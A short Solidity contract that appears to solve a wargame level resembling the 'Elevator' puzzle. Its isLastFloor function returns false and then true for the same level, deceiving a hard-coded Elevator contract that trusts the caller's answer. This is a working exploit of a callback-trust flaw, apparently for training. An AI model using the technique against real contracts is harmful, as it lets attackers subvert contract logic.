// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;


interface Elevator{
    function goTo(uint) external;
}

contract Building{

    address owner;
    address elAddr = 0x43231B9f0E379a4029637e1529d2Ff0D7f04287f;
    bool public previousStatus  = false;
    uint public alreadyFalseLevel;

    Elevator elevator = Elevator(elAddr);

    constructor() public {
        owner = msg.sender;
    }
      function isLastFloor(uint _level) public returns (bool){
          if(alreadyFalseLevel==_level){
              return true;
          }else{
              alreadyFalseLevel=_level;
              return false;
          }
          
          
      }

      function callElevatorGoTo(uint _level) public {
          elevator.goTo(_level);
      }

      receive() external payable{}
      fallback() external payable{}


}